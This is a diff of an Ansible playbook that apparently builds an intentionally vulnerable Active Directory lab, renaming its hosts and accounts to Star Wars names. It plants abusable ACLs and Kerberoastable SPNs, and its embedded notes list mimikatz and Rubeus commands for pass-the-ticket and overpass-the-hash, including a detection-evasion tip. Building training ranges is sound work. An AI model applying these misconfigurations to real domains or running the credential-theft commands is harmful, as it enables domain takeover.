@@ -1,10 +1,10 @@
 ---
 # ==============================================================================
 # vuln_lat_ext/tasks/acl_abuse.yml
-# Target: dc01.corp.local
+# Target: coruscant.empire.local
 #
 # LAT-023  LAPS read ACL for IT_Team (ms-Mcs-AdmPwd read on Computers OU)
-# LAT-024  Cross-forest SPN abuse (svc_printer with SPN on finance.local)
+# LAT-024  Cross-forest SPN abuse (svc_trooper with SPN on rebel.local)
 # LAT-025  WriteSPN on HelpDesk users (targeted Kerberoast-able accounts)
 # LAT-029  ForceChangePassword on IT_Team members
 # LAT-030  GenericWrite on service accounts for SPN add (Kerberoasting)
@@ -59,11 +59,11 @@
   changed_when: "'changed:' in lat023_set.stdout"
   failed_when: lat023_set.rc != 0
 
-# LAT-025: WriteSPN on jim.halpert (targeted Kerberoasting target setup)
+# LAT-025: WriteSPN on luke.skywalker (targeted Kerberoasting target setup)
 - name: LAT-025 - Check if svc_sqlweb has SPN
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    $u = Get-ADUser -Identity 'jim.halpert' -Properties ServicePrincipalNames `
+    $u = Get-ADUser -Identity 'luke.skywalker' -Properties ServicePrincipalNames `
            -ErrorAction SilentlyContinue
     if ($u -and ($u.ServicePrincipalNames -ne $null) -and $u.ServicePrincipalNames.Count -gt 0) {
       Write-Output "present: $($u.ServicePrincipalNames -join ',')"
@@ -74,13 +74,13 @@
   changed_when: false
   failed_when: lat025_check.rc != 0
 
-- name: LAT-025 - Add SPN to jim.halpert (Kerberoasting target via WriteSPN ACL)
+- name: LAT-025 - Add SPN to luke.skywalker (Kerberoasting target via WriteSPN ACL)
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
     try {
-      Set-ADUser -Identity 'jim.halpert' `
-        -ServicePrincipalNames @{Add='HTTP/jim.halpert-web.corp.local:8080'}
-      Write-Output "changed: SPN added to jim.halpert"
+      Set-ADUser -Identity 'luke.skywalker' `
+        -ServicePrincipalNames @{Add='HTTP/luke.skywalker-web.empire.local:8080'}
+      Write-Output "changed: SPN added to luke.skywalker"
     } catch {
       Write-Output "WARN: $($_.Exception.Message)"
     }
@@ -126,12 +126,12 @@
   changed_when: "'changed:' in lat029_set.stdout"
   failed_when: lat029_set.rc != 0
 
-# LAT-030: GenericWrite on svc_darryl2 for SPN add (targeted Kerberoasting)
-- name: LAT-030 - Grant HelpDesk GenericWrite on svc_darryl2
+# LAT-030: GenericWrite on svc_bobafett2 for SPN add (targeted Kerberoasting)
+- name: LAT-030 - Grant HelpDesk GenericWrite on svc_bobafett2
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
     try {
-      $u   = Get-ADUser -Identity 'svc_darryl2' -ErrorAction Stop
+      $u   = Get-ADUser -Identity 'svc_bobafett2' -ErrorAction Stop
       $sid = (Get-ADGroup -Identity 'HelpDesk' -ErrorAction Stop).SID
       $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
         $sid,
@@ -141,7 +141,7 @@
       $obj = [ADSI]"LDAP://$($u.DistinguishedName)"
       $obj.ObjectSecurity.AddAccessRule($ace)
       $obj.CommitChanges()
-      Write-Output "changed: HelpDesk GenericWrite on svc_darryl2"
+      Write-Output "changed: HelpDesk GenericWrite on svc_bobafett2"
     } catch {
       Write-Output "WARN: $($_.Exception.Message)"
     }
@@ -168,12 +168,12 @@
       -Description "LAT-031: WriteOwner ACL abuse target"
   when: "'absent' in lat031_group_check.stdout"
 
-- name: LAT-031 - Grant svc_darryl WriteOwner on finance_sync
+- name: LAT-031 - Grant svc_bobafett WriteOwner on finance_sync
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
     try {
       $g   = Get-ADGroup -Identity 'finance_sync' -ErrorAction Stop
-      $sid = (Get-ADUser -Identity 'svc_darryl' -ErrorAction Stop).SID
+      $sid = (Get-ADUser -Identity 'svc_bobafett' -ErrorAction Stop).SID
       $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
         $sid,
         [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner,
@@ -182,7 +182,7 @@
       $obj = [ADSI]"LDAP://$($g.DistinguishedName)"
       $obj.ObjectSecurity.AddAccessRule($ace)
       $obj.CommitChanges()
-      Write-Output "changed: svc_darryl WriteOwner on finance_sync"
+      Write-Output "changed: svc_bobafett WriteOwner on finance_sync"
     } catch {
       Write-Output "WARN: $($_.Exception.Message)"
     }
@@ -209,9 +209,9 @@
         Rubeus ptt /ticket:<base64>
 
       Targets with interesting tickets:
-        - dc01: krbtgt TGT (if admin session cached)
-        - file01: file share access TGTs (svc_darryl, Administrator)
-        - sql01: SQL service TGTs
+        - coruscant: krbtgt TGT (if admin session cached)
+        - scarif: file share access TGTs (svc_bobafett, Administrator)
+        - kamino: SQL service TGTs
 
 # LAT-035: AES key extraction for Overpass-the-Hash
 - name: LAT-035 - Drop Overpass-the-Hash surface note
@@ -227,8 +227,8 @@
         mimikatz# sekurlsa::ekeys
 
       Overpass-the-Hash (convert NT hash → TGT):
-        Rubeus asktgt /user:Administrator /rc4:<NT_HASH> /domain:corp.local /ptt
-        mimikatz# sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<hash>
+        Rubeus asktgt /user:Administrator /rc4:<NT_HASH> /domain:empire.local /ptt
+        mimikatz# sekurlsa::pth /user:Administrator /domain:EMPIRE /ntlm:<hash>
 
       Use AES key (opsec: avoids RC4 downgrade detection):
-        Rubeus asktgt /user:svc_darryl /aes256:<AES_KEY> /domain:corp.local /ptt
+        Rubeus asktgt /user:svc_bobafett /aes256:<AES_KEY> /domain:empire.local /ptt
